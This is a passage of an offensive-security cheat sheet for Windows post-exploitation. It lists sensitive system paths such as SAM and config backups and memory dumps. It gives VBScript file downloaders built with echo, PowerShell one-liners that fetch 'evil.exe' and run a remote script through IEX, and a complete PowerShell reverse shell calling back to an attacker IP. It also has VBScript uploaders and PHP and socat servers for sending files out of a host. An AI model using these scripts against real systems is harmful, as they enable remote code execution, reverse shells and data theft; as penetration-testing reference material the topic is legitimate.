</h2> <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">C</span>:\Program <span class="kd">Files</span>

<span class="kd">C</span>:\WINDOWS\Debug

<span class="c">:: Logs from Apps</span>
<span class="kd">C</span>:\WINDOWS\system32\LogFiles

<span class="c">:: SAM &amp; System - Check .bak</span>
<span class="kd">C</span>:\WINDOWS\system32\config

<span class="c">:: Memory dumps</span>
<span class="kd">C</span>:\WINDOWS\MEMORY.DMP

<span class="c">:: Nothing special</span>
<span class="kd">C</span>:\WINDOWS\system32\ReinstallBackups

<span class="c">:: Search *.log *.bak</span>
<span class="kd">C</span>:\WINDOWS\</code></pre></div></div> <h1 id="file"> <a href="#file" class="anchor-heading" aria-labelledby="file"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> File </h1> <h2 id="file--transfer"> <a href="#file--transfer" class="anchor-heading" aria-labelledby="file--transfer"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Transfer </h2> <h3 id="file--transfer--windows"> <a href="#file--transfer--windows" class="anchor-heading" aria-labelledby="file--transfer--windows"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Windows </h3> <h4 id="file--transfer--windows--download"> <a href="#file--transfer--windows--download" class="anchor-heading" aria-labelledby="file--transfer--windows--download"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Download </h4> <h5 id="file--transfer--windows--download--cmd-exe"> <a href="#file--transfer--windows--download--cmd-exe" class="anchor-heading" aria-labelledby="file--transfer--windows--download--cmd-exe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> cmd.exe </h5> <ul> <li>VBScript to download binary files (type 1 -&gt; bin; type 2 -&gt; text but it looks like 2 doesn&#8217;t work and 1 also works with text) using ADO DB, run it with <code>cscript //B //T:180 //Nologo wget.vbs &quot;http://&lt;ip-port&gt;/&lt;remote-file&gt;&quot; &quot;&lt;name&gt;&quot;</code>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="kd">Dim</span> <span class="kd">strURL</span><span class="o">,</span> <span class="kd">StrFile</span> <span class="o">&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">strUrl</span> <span class="o">=</span> <span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">0</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">StrFile</span> <span class="o">=</span> <span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">1</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_DEFAULT</span> <span class="o">=</span> <span class="m">0</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_PRECONFIG</span> <span class="o">=</span> <span class="m">0</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_DIRECT</span> <span class="o">=</span> <span class="m">1</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_PROXY</span> <span class="o">=</span> <span class="m">2</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Dim</span> <span class="kd">http</span><span class="o">,</span> <span class="kd">bytes</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Err</span>.Clear <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"WinHttp.WinHttpRequest.5.1"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"WinHttp.WinHttpRequest"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"MSXML2.ServerXMLHTTP"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Microsoft.XMLHTTP"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">WScript</span>.Echo <span class="s2">"Downloading "</span> <span class="se">^&amp;</span> <span class="kd">StrFile</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.Open <span class="s2">"GET"</span><span class="o">,</span> <span class="kd">strURL</span><span class="o">,</span> <span class="kd">False</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.Send <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">bytes</span> <span class="o">=</span> <span class="kd">http</span>.ResponseBody <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">With</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"ADODB.Stream"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> .Open <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> .type <span class="o">=</span> <span class="m">1</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> .Write <span class="kd">bytes</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> .SaveToFile <span class="kd">StrFile</span><span class="o">,</span> <span class="m">2</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">End</span> <span class="kd">With</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">WScript</span>.Echo <span class="s2">"Done"</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs</code></pre></div></div></li> <li>Alternate script in case ADO DB is not installed using the trick described <a href="https://stackoverflow.com/a/6087783">here</a>, note that it is unreliable and may take a long time to write files:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="kd">Dim</span> <span class="kd">strURL</span><span class="o">,</span> <span class="kd">StrFile</span> <span class="o">&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">strUrl</span> <span class="o">=</span> <span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">0</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">StrFile</span> <span class="o">=</span> <span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">1</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_DEFAULT</span> <span class="o">=</span> <span class="m">0</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_PRECONFIG</span> <span class="o">=</span> <span class="m">0</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_DIRECT</span> <span class="o">=</span> <span class="m">1</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_PROXY</span> <span class="o">=</span> <span class="m">2</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Dim</span> <span class="kd">http</span><span class="o">,</span> <span class="kd">varByteArray</span><span class="o">,</span> <span class="kd">strData</span><span class="o">,</span> <span class="kd">strBuffer</span><span class="o">,</span> <span class="kd">lngCounter</span><span class="o">,</span> <span class="kd">fs</span><span class="o">,</span> <span class="kd">ts</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Err</span>.Clear <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"WinHttp.WinHttpRequest.5.1"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"WinHttp.WinHttpRequest"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"MSXML2.ServerXMLHTTP"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Microsoft.XMLHTTP"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.Open <span class="s2">"GET"</span><span class="o">,</span> <span class="kd">strURL</span><span class="o">,</span> <span class="kd">False</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.Send <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">varByteArray</span> <span class="o">=</span> <span class="kd">http</span>.ResponseBody <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">fs</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Scripting.FileSystemObject"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">ts</span> <span class="o">=</span> <span class="kd">fs</span>.CreateTextFile<span class="o">(</span><span class="kd">StrFile</span><span class="o">,</span> <span class="kd">True</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">strData</span> <span class="o">=</span> <span class="s2">""</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">strBuffer</span> <span class="o">=</span> <span class="s2">""</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">For</span> <span class="kd">lngCounter</span> <span class="o">=</span> <span class="m">0</span> <span class="kd">to</span> <span class="kd">UBound</span><span class="o">(</span><span class="kd">varByteArray</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">ts</span>.Write <span class="kd">Chr</span><span class="o">(</span><span class="m">255</span> <span class="kd">And</span> <span class="kd">Ascb</span><span class="o">(</span><span class="kd">Midb</span><span class="o">(</span><span class="kd">varByteArray</span><span class="o">,</span><span class="kd">lngCounter</span> <span class="o">+</span> <span class="m">1</span><span class="o">,</span> <span class="m">1</span><span class="o">)))</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">Next</span> <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs
<span class="nb">echo</span> <span class="kd">ts</span>.Close <span class="o">&gt;&gt;</span> <span class="nb">wget</span>.vbs</code></pre></div></div></li> </ul> <h5 id="file--transfer--windows--download--powershell"> <a href="#file--transfer--windows--download--powershell" class="anchor-heading" aria-labelledby="file--transfer--windows--download--powershell"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PowerShell </h5> <ul> <li>Using <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?redirectedfrom=MSDN&amp;view=netframework-4.8">System.Net.WebClient</a><div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Download file</span>
<span class="kd">powershell</span><span class="err">.exe</span> <span class="o">(</span><span class="kd">New</span><span class="na">-Object </span><span class="kd">System</span>.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'http://&lt;ip&gt;/evil.exe'</span><span class="o">,</span> <span class="s1">'evil.exe'</span><span class="o">)</span>

<span class="c">:: Download and execute remote PS1</span>
<span class="kd">powershell</span> <span class="kd">IEX</span> <span class="o">(</span><span class="kd">New</span><span class="na">-Object </span><span class="kd">Net</span>.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">"http://&lt;ip&gt;/shell.ps1"</span><span class="o">);</span>
<span class="c">:: shell.ps1</span>
$client <span class="o">=</span> <span class="kd">New</span><span class="na">-Object </span><span class="kd">System</span>.Net.Sockets.TCPClient<span class="o">(</span><span class="s2">"&lt;ip&gt;"</span><span class="o">,&lt;</span><span class="kd">port</span><span class="o">&gt;);</span>$stream <span class="o">=</span> $client.GetStream<span class="o">();[</span><span class="kd">byte</span><span class="o">[]]</span>$bytes <span class="o">=</span> <span class="m">0</span>..65535<span class="o">|</span><span class="err">%</span><span class="o">{</span><span class="m">0</span><span class="o">};</span><span class="kd">while</span><span class="o">((</span>$i <span class="o">=</span> $stream.Read<span class="o">(</span>$bytes<span class="o">,</span> <span class="m">0</span><span class="o">,</span> $bytes.Length<span class="o">))</span> <span class="na">-ne </span><span class="m">0</span><span class="o">){;</span>$data <span class="o">=</span> <span class="o">(</span><span class="kd">New</span><span class="na">-Object -TypeName </span><span class="kd">System</span>.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span>$bytes<span class="o">,</span><span class="m">0</span><span class="o">,</span> $i<span class="o">);</span>$sendback <span class="o">=</span> <span class="o">(</span><span class="kd">iex</span> $data <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span> <span class="o">|</span> <span class="kd">Out</span><span class="na">-String </span><span class="o">);</span>$sendback2 <span class="o">=</span> $sendback <span class="o">+</span> <span class="s2">"# "</span><span class="o">;</span>$sendbyte <span class="o">=</span> <span class="o">([</span><span class="kd">text</span>.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span>$sendback2<span class="o">);</span>$stream.Write<span class="o">(</span>$sendbyte<span class="o">,</span><span class="m">0</span><span class="o">,</span>$sendbyte.Length<span class="o">);</span>$stream.Flush<span class="o">()};</span>$client.Close<span class="o">()</span></code></pre></div></div></li> </ul> <h5 id="file--transfer--windows--download--smb"> <a href="#file--transfer--windows--download--smb" class="anchor-heading" aria-labelledby="file--transfer--windows--download--smb"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SMB </h5> <ul> <li>Check the Impacket&gt;SMBserver section</li> </ul> <h4 id="file--transfer--windows--upload"> <a href="#file--transfer--windows--upload" class="anchor-heading" aria-labelledby="file--transfer--windows--upload"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Upload </h4> <h5 id="file--transfer--windows--upload--servers"> <a href="#file--transfer--windows--upload--servers" class="anchor-heading" aria-labelledby="file--transfer--windows--upload--servers"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Servers </h5> <ul> <li>Apache-PHP local server for uploads: <code>/var/www/html/upload.php</code> (don&#8217;t forget to set the <code>upload</code> folder to <code>www-data</code> owner), note that the PHP built-in web server <a href="https://www.php.net/manual/en/features.commandline.webserver.php">also parses PHP</a>, so maybe this file also works:<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s1">'/var/www/uploads/'</span><span class="p">;</span>
<span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="mf">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
<span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nv">$uploadfile</span><span class="p">)</span>
<span class="cp">?&gt;</span></code></pre></div></div></li> <li>Socat local server for the VBS:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat TCP-LISTEN:8081,reuseaddr,fork SYSTEM:<span class="s1">'file="$(eval printf "$(sed -u "s,^POST /\\+\\|\\.\\+/\\| HTTP[^ ]*$,,g;s,/\\+,/,g;s/%\\([0-9]\\+\\)/\\$(printf \\"\\\\\\%03o\\" \\$((0x\\1)))/g;q")")"; length=$(sed -nu "s,^Content-Length:\\s*\\([0-9]\\+\\).*,\\1,gp;/^\\s*$/q"); echo "[$(date "+%F %T")] Receiving $file - size $(numfmt --to=iec-i --suffix=B $length)" &gt;&amp;2; eval "dd ibs=1 count=$length of=\\\"$file\\\" status=none"; printf "\\r\\n"'</span></code></pre></div></div></li> </ul> <h5 id="file--transfer--windows--upload--cmd-exe"> <a href="#file--transfer--windows--upload--cmd-exe" class="anchor-heading" aria-labelledby="file--transfer--windows--upload--cmd-exe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> cmd.exe </h5> <ul> <li>Adapted VBScript from <a href="https://stackoverflow.com/a/35617532">this</a>, note that <a href="https://www.w3schools.com/asp/prop_stream_type.asp">type 1 is binary and 2 text</a>, use it as <code>cscript //B //T:180 //Nologo upload.vbs &quot;http://&lt;ip-port&gt;/&lt;remote-name&gt;&quot; &quot;&lt;file&gt;&quot;</code> (quote the parameters to include spaces); upload all files in a directory with <code>for %f in (.\*) do @cscript...%f &quot;%f&quot;</code> (<code>for /R %f</code> for recursion), hidden files with <code>for /f &quot;tokens=*&quot; %f in (&#39;dir /b/a:-d&#39;) do @cscript...</code>:</li> </ul> <p>-</p><div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="kd">Dim</span> <span class="kd">strURL</span><span class="o">,</span> <span class="kd">strFile</span><span class="o">,</span> <span class="kd">dataFile</span><span class="o">,</span> <span class="kd">dataRequest</span> <span class="o">&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">strUrl</span> <span class="o">=</span> <span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">0</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">strFile</span> <span class="o">=</span> <span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">1</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_DEFAULT</span> <span class="o">=</span> <span class="m">0</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_PRECONFIG</span> <span class="o">=</span> <span class="m">0</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_DIRECT</span> <span class="o">=</span> <span class="m">1</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_PROXY</span> <span class="o">=</span> <span class="m">2</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Err</span>.Clear <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Microsoft.XMLHTTP"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"WinHttp.WinHttpRequest"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"MSXML2.ServerXMLHTTP"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">If</span> <span class="kd">http</span> <span class="kd">Is</span> <span class="kd">Nothing</span> <span class="kd">Then</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"Microsoft.XMLHTTP"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">WScript</span>.Echo <span class="s2">"Uploading "</span> <span class="se">^&amp;</span> <span class="kd">strFile</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">With</span> <span class="kd">WScript</span>.CreateObject<span class="o">(</span><span class="s2">"ADODB.Stream"</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> .Open <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> .type <span class="o">=</span> <span class="m">1</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> .LoadFromFile<span class="o">(</span><span class="kd">strFile</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">dataFile</span> <span class="o">=</span> .Read<span class="o">()</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">End</span> <span class="kd">With</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">dataRequest</span> <span class="o">=</span> <span class="kd">dataFile</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.open <span class="s2">"POST"</span><span class="o">,</span> <span class="kd">strURL</span><span class="o">,</span> <span class="kd">False</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.setRequestHeader <span class="s2">"Content-Type"</span><span class="o">,</span> <span class="s2">"application/x-www-form-urlencoded"</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.setRequestHeader <span class="s2">"Content-Length"</span><span class="o">,</span> <span class="kd">Len</span><span class="o">(</span><span class="kd">dataRequest</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">http</span>.send <span class="kd">dataRequest</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">WScript</span>.Echo <span class="s2">"Done"</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Set</span> <span class="kd">http</span> <span class="o">=</span> <span class="kd">Nothing</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs</code></pre></div></div> <ul> <li>Convert the &#8220;binary&#8221; text files to &#8220;text&#8221; with <code>iconv</code> and <code>chardetect</code> (<code>pip install chardet</code>) - <a href="https://unix.stackexchange.com/a/304178">reference</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Detect the charset</span>
file <span class="nt">-i</span> &lt;text-file-in-binary&gt;

<span class="c"># Or, alternatively:</span>
chardet &lt;text-file-in-binary&gt;

<span class="c"># Check if it is BE or LE:</span>
<span class="c"># -&gt; LE if the odd colums are 000</span>
<span class="nb">od </span>An <span class="nt">-bc</span> &lt;text-file-in-binary&gt; | less

<span class="c"># Convert it with GNU strings:</span>
<span class="c"># Add -w if missing tabs/newlines</span>
strings <span class="nt">-ael</span> &lt;text-file-in-binary&gt; <span class="o">&gt;</span> &lt;converted&gt;

<span class="c"># Using POSIX iconv:</span>
<span class="c"># List all iconv encodings</span>
iconv <span class="nt">-l</span>

<span class="c"># Convert it to UTF-8</span>
iconv <span class="nt">-f</span> UTF-16LE// <span class="nt">-t</span> UTF-8// &lt; &lt;text-file-in-binary&gt; <span class="o">&gt;</span> &lt;converted&gt;

<span class="c"># Check the type again:</span>
file <span class="nt">-i</span> &lt;text-file-in-binary&gt;

<span class="c"># Filter it if is still not correct:</span>
strings <span class="nt">-w</span> &lt;converted&gt; <span class="o">&gt;</span> &lt;clean&gt;</code></pre></div></div></li> <li>This is an alternative in case ADO DB is not installed, but only works reliable with non-binary files, though you may try <a href="https://stackoverflow.com/a/6087783">this workaround</a>:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="kd">Dim</span> <span class="kd">strURL</span><span class="o">,</span> <span class="kd">strFile</span><span class="o">,</span> <span class="kd">dataFile</span><span class="o">,</span> <span class="kd">dataRequest</span> <span class="o">&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">strUrl</span> <span class="o">=</span> <span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">0</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">strFile</span> <span class="o">=</span> <span class="kd">WScript</span>.Arguments.Item<span class="o">(</span><span class="m">1</span><span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_DEFAULT</span> <span class="o">=</span> <span class="m">0</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
<span class="nb">echo</span> <span class="kd">Const</span> <span class="kd">HTTPREQUEST_PROXYSETTING_PRECONFIG</span> <span class="o">=</span> <span class="m">0</span> <span class="o">&gt;&gt;</span> <span class="kd">upload</span>.vbs
